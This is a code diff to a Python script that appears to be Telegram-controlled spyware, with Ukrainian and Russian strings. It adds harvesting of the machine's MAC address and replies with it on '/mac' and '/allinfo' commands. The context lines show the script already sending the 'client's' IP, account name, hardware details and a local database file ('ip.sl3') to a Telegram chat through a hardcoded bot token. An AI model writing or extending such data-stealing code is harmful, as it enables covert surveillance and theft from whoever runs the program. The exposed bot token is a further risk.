@@ -9,7 +9,10 @@ import socket
 import ctypes
 import platform
 import telebot
+from uuid import getnode as get_mac
 bot = telebot.TeleBot("6814382026:AAF2FmkAFVY7Fo-BDSpgwJd5IizfLK1kXZ8")
+
+mac = get_mac()
 
 my_system = platform.uname()
 
@@ -132,6 +135,9 @@ def main():
             elif get_message_text(upd).lower() == "/name":
                 send_message(get_chat_id(upd),
                              f"Ім'я облікового запису клієнта: {d_n}")
+            elif get_message_text(upd).lower() == "/mac":
+                send_message(get_chat_id(upd),
+                             f"MAC-адрес клієнта: {mac}")
             elif get_message_text(upd).lower() == "/allinfo":
                 send_message(get_chat_id(upd),
                              f"IP клієнта: {a}")
@@ -151,6 +157,8 @@ def main():
                              f"Процессор: {my_system.processor}")
                 send_message(get_chat_id(upd),
                              f"Машина: {my_system.machine}")
+                send_message(get_chat_id(upd),
+                             f"MAC-адрес клієнта: {mac}")
                 send_message(get_chat_id(upd),
                              f"База даних запитів з пристрою клієнта:")
                 upfile = open("ip.sl3", "rb")
